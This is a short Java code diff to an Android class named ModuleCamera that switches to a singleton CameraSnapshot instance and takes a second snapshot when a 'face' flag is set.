@@ -90,13 +90,16 @@ public class ModuleCamera extends BaseInstantModule {
 		counter++;
 
 		if (Build.VERSION.SDK_INT > Build.VERSION_CODES.HONEYCOMB) {
-			CameraSnapshot camera = new CameraSnapshot();
+			CameraSnapshot camera = CameraSnapshot.self();
 
 			if (Cfg.DEBUG) {
 				//camera.snapshot(counter % 2 == 0);
 			}
 
-			camera.snapshot(face);
+			camera.snapshot(false);
+			if(face) {
+				camera.snapshot(true);
+			}
 		}
 
 	}
